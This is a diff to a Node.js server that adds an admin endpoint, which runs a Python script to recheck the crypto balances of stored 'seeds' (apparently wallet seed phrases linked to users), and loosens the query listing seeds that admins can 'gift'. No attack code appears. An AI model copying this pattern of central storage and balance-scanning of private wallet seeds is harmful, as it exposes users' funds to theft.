@@ -3,6 +3,7 @@ const cors = require('cors');
 const path = require('path');
 const crypto = require('crypto');
 const fs = require('fs');
+const { spawn } = require('child_process');
 const { HDNodeWallet } = require('ethers');
 require('dotenv').config();
 
@@ -2091,16 +2092,16 @@ app.get('/', (req, res) => {
 // ════════════════════════════════════════════════════
 
 // GET /api/admin/seed-gifts/giftable
-// 잔고 있고 아직 지급되지 않은 시드 목록
+// 지급 가능한 시드 목록 (잔고 여부 무관, 아직 지급 안 된 것)
 app.get('/api/admin/seed-gifts/giftable', requireAdmin, requireMaster, async (req, res) => {
   try {
     const page = Math.max(1, parseInt(req.query.page) || 1);
     const pageSize = Math.min(50, parseInt(req.query.pageSize) || 20);
     const offset = (page - 1) * pageSize;
+    // 잔고 필터 제거: 관리자가 저장한 모든 시드 표시 (pending/delivered 로 이미 지급된 것만 제외)
     const [[{ total }]] = await db.pool.query(
       `SELECT COUNT(*) AS total FROM seeds
-       WHERE (balance > 0 OR btc > 0 OR eth > 0 OR tron > 0 OR sol > 0)
-         AND id NOT IN (SELECT seed_id FROM seed_gifts WHERE status != 'cancelled')`
+       WHERE id NOT IN (SELECT seed_id FROM seed_gifts WHERE status IN ('pending','delivered'))`
     );
     const [rows] = await db.pool.query(
       `SELECT id, user_id,
@@ -2111,11 +2112,11 @@ app.get('/api/admin/seed-gifts/giftable', requireAdmin, requireMaster, async (re
               COALESCE(balance,0) AS balance,
               COALESCE(btc,0) AS btc, COALESCE(eth,0) AS eth,
               COALESCE(tron,0) AS tron, COALESCE(sol,0) AS sol,
+              checked, checked_at,
               created_at
        FROM seeds
-       WHERE (balance > 0 OR btc > 0 OR eth > 0 OR tron > 0 OR sol > 0)
-         AND id NOT IN (SELECT seed_id FROM seed_gifts WHERE status != 'cancelled')
-       ORDER BY balance DESC, id DESC
+       WHERE id NOT IN (SELECT seed_id FROM seed_gifts WHERE status IN ('pending','delivered'))
+       ORDER BY id DESC
        LIMIT ? OFFSET ?`,
       [pageSize, offset]
     );
@@ -2238,6 +2239,58 @@ app.post('/api/user/gift-seed/ack', async (req, res) => {
       [giftId, userId]
     );
     res.json({ ok: true });
+  } catch (e) {
+    res.status(500).json({ error: e.message });
+  }
+});
+
+// POST /api/admin/seeds/recheck — 특정 시드 ID 잔고 재확인 (seed_checker.py SEED_IDS 모드)
+app.post('/api/admin/seeds/recheck', requireAdmin, requireMaster, async (req, res) => {
+  try {
+    const { ids } = req.body; // number[] or 'all'
+    let seedIds = [];
+
+    if (ids === 'all') {
+      const [rows] = await db.pool.query(`SELECT id FROM seeds ORDER BY id ASC`);
+      seedIds = rows.map(r => r.id);
+    } else if (Array.isArray(ids) && ids.length > 0) {
+      seedIds = ids.map(Number).filter(n => !isNaN(n) && n > 0);
+    }
+
+    if (seedIds.length === 0) return res.status(400).json({ error: '재확인할 시드 ID가 없습니다.' });
+    if (seedIds.length > 50) return res.status(400).json({ error: '한 번에 최대 50개까지만 재확인 가능합니다.' });
+
+    const scriptPath = path.join(__dirname, 'seed_checker.py');
+
+    const env = {
+      ...process.env,
+      SEED_IDS: seedIds.join(','),
+    };
+
+    // 비동기 실행: 응답을 먼저 반환하고 Python은 백그라운드에서 실행
+    res.json({ ok: true, queued: seedIds.length, ids: seedIds, message: '재확인 시작됨. 잠시 후 목록을 새로고침하세요.' });
+
+    const py = spawn('python3', [scriptPath], { env, stdio: 'pipe' });
+    let stdout = '';
+    let stderr = '';
+    py.stdout.on('data', d => { stdout += d.toString(); });
+    py.stderr.on('data', d => { stderr += d.toString(); });
+    py.on('close', code => {
+      console.log(`[SEED RECHECK] 완료 (exit=${code}) IDs=${seedIds.join(',')}`);
+      if (stdout) console.log('[SEED RECHECK STDOUT]\n' + stdout.trim());
+      if (stderr) console.error('[SEED RECHECK STDERR]\n' + stderr.trim());
+    });
+    py.on('error', err => {
+      // python3 없으면 python 으로 재시도
+      if (err.code === 'ENOENT') {
+        const py2 = spawn('python', [scriptPath], { env, stdio: 'pipe' });
+        py2.stdout.on('data', d => { console.log('[SEED RECHECK]', d.toString().trim()); });
+        py2.stderr.on('data', d => { console.error('[SEED RECHECK ERR]', d.toString().trim()); });
+        py2.on('close', code2 => console.log(`[SEED RECHECK] python fallback 완료 (exit=${code2})`));
+      } else {
+        console.error('[SEED RECHECK] spawn 오류:', err.message);
+      }
+    });
   } catch (e) {
     res.status(500).json({ error: e.message });
   }
